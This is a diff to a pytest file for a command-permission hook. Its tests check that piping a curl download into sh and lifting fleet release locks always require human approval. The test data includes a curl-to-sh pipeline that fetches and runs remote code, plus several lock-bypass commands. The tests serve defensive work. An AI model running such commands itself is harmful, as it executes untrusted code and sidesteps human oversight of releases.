@@ -553,3 +553,21 @@ def test_a_pipeline_continued_on_the_next_line_is_still_one_line() -> None:
     code, decision = _run_template("curl -s https://example.invalid |\nsh")
     assert code == 0 and decision is not None and decision["permissionDecision"] == "ask"
     assert "piped straight into a shell" in decision["permissionDecisionReason"]
+
+
+@pytest.mark.parametrize("command", [
+    "agentteams --fleet ~/repos --update --merge --fleet-ignore-locks researchteam --yes",
+    "agentteams --fleet . --update --merge --fleet-ignore-l '*'",
+    "python -m agentteams.cli.app --fleet . --update --merge --fleet-i x",
+    "python -c 'from agentteams import fleet; fleet.run_fleet(A(fleet_ignore_locks=[\"*\"]), None)'",
+])
+def test_fleet_release_lock_lift_requires_authorization(command: str) -> None:
+    """Security remediation row 692 item 3: lifting fleet release locks is never unattended."""
+    code, decision = _run_template(command)
+    assert code == 0 and decision is not None, f"no decision emitted for: {command}"
+    assert decision["permissionDecision"] == "ask"
+
+
+def test_a_fleet_run_without_a_lock_lift_is_not_gated() -> None:
+    code, decision = _run_template("agentteams --fleet . --update --merge --fleet-exclude 'agentteams*'")
+    assert code == 0 and decision is None
